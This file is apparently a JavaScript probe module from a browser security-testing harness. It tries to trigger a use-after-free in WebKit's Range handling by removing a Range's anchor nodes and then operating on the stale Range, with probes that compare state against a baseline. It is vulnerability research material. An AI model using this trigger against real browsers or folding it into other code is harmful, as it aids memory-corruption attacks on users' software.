/**
 * SC_RANGE_BOUNDARY_UAF.JS
 * Categoria : DOM — Use-After-Free
 * Alvo      : WebCore::Range / AbstractRange C++ lifecycle
 * Técnica   : Cria um Range com startContainer e endContainer apontando
 *             para nós do DOM, remove esses nós e opera sobre o Range
 *             stale. O Range C++ mantém ponteiros para os nós âncora
 *             que podem ser coletados enquanto o Range JS ainda existe.
 * Referência: WebKit Range node lifecycle UAF pattern
 */

export default {
    id:          'RANGE_BOUNDARY_UAF',
    category:    'DOM',
    risk:        'HIGH',
    description: 'Range com startContainer/endContainer removidos do DOM. '
                + 'Testa acesso a nós âncora C++ após GC do WebCore.',

    _container:  null,
    _nodeA:      null,
    _nodeB:      null,
    _range:      null,
    _selection:  null,

    // Numéricos
    _startOffset: -1,
    _endOffset:   -1,
    _collapsed:   'pending',   // string (boolean serializado)
    _startNode:   'pending',
    _endNode:     'pending',
    _cloneText:   'pending',
    _extractErr:  'none',

    supported: function() {
        return typeof document.createRange !== 'undefined';
    },

    setup: async function() {
        this._startOffset = -1; this._endOffset = -1;
        this._collapsed   = 'pending'; this._startNode = 'pending';
        this._endNode     = 'pending'; this._cloneText = 'pending';
        this._extractErr  = 'none';

        this._container = document.createElement('div');
        document.body.appendChild(this._container);

        this._nodeA = document.createElement('p');
        this._nodeA.textContent = 'range-start-canary';
        this._nodeB = document.createElement('p');
        this._nodeB.textContent = 'range-end-canary';

        this._container.appendChild(this._nodeA);
        this._container.appendChild(this._nodeB);

        // Cria Range entre os dois nós
        this._range = document.createRange();
        this._range.setStart(this._nodeA.firstChild, 0);
        this._range.setEnd(this._nodeB.firstChild, 9);

        // Captura baseline
        this._startOffset = this._range.startOffset;
        this._endOffset   = this._range.endOffset;
        this._collapsed   = String(this._range.collapsed);
        this._startNode   = this._range.startContainer?.nodeName ?? 'null';
        this._endNode     = this._range.endContainer?.nodeName   ?? 'null';
        this._cloneText   = this._range.cloneContents()?.textContent?.slice(0, 30) ?? 'null';

        // Adiciona ao Selection para pressionar mais o C++
        try {
            this._selection = window.getSelection();
            this._selection.removeAllRanges();
            this._selection.addRange(this._range);
        } catch(_) {}

        void this._container.offsetWidth;
        await new Promise(r => setTimeout(r, 0));
    },

    trigger: async function() {
        // Remove os nós âncora do Range
        this._nodeA.remove();
        this._nodeB.remove();
        void document.body.offsetWidth;

        // Tenta operar sobre o Range com âncoras removidas
        try { this._range.collapse(true); }         catch(_) {}
        try { this._range.selectNode(document.body); } catch(_) {}

        // Tenta extrair conteúdo de Range stale
        try {
            this._range.extractContents();
            this._extractErr = 'no-throw';
        } catch(e) {
            this._extractErr = e.constructor.name;
        }

        // Tenta clonar o range stale
        try { this._range.cloneRange(); }           catch(_) {}

        await new Promise(r => setTimeout(r, 0));
    },

    probe: [
    // [0]
    s => { console.log('[RANGE] probe 0 — startOffset'); return s._range.startOffset; },
    // [1]
    s => { console.log('[RANGE] probe 1 — startOffset baseline'); return s._startOffset; },
    // [2]
    s => { console.log('[RANGE] probe 2 — endOffset'); return s._range.endOffset; },
    // [3]
    s => { console.log('[RANGE] probe 3 — endOffset baseline'); return s._endOffset; },

    // [4]
    s => { console.log('[RANGE] probe 4 — startContainer nodeName'); return s._range.startContainer?.nodeName ?? 'null'; },
    // [5]
    s => { console.log('[RANGE] probe 5 — startNode baseline'); return s._startNode; },
    // [6]
    s => { console.log('[RANGE] probe 6 — endContainer nodeName'); return s._range.endContainer?.nodeName ?? 'null'; },
    // [7]
    s => { console.log('[RANGE] probe 7 — endNode baseline'); return s._endNode; },

    // [8]
    s => { console.log('[RANGE] probe 8 — collapsed'); return String(s._range.collapsed); },
    // [9]
    s => { console.log('[RANGE] probe 9 — collapsed baseline'); return s._collapsed; },
    // [10]
    s => { console.log('[RANGE] probe 10 — cloneContents text'); return s._range.cloneContents()?.textContent?.slice(0, 30) ?? 'null'; },

    // [11]
    s => { console.log('[RANGE] probe 11 — extractErr'); return s._extractErr; },
    // [12]
    s => { console.log('[RANGE] probe 12 — selection rangeCount'); return String(s._selection?.rangeCount ?? -1); },

    // [13]
    s => { console.log('[RANGE] probe 13 — container isConnected'); return String(s._container.isConnected); },
],

    cleanup: async function() {
        try { this._selection?.removeAllRanges(); }  catch(_) {}
        try { this._range?.detach?.(); }             catch(_) {}
        this._container?.remove();
        this._container = null; this._nodeA = null; this._nodeB = null;
        this._range = null; this._selection = null;
        this._startOffset = -1; this._endOffset = -1;
        this._collapsed = 'pending'; this._startNode = 'pending';
        this._endNode   = 'pending'; this._cloneText = 'pending';
        this._extractErr = 'none';
    }
};
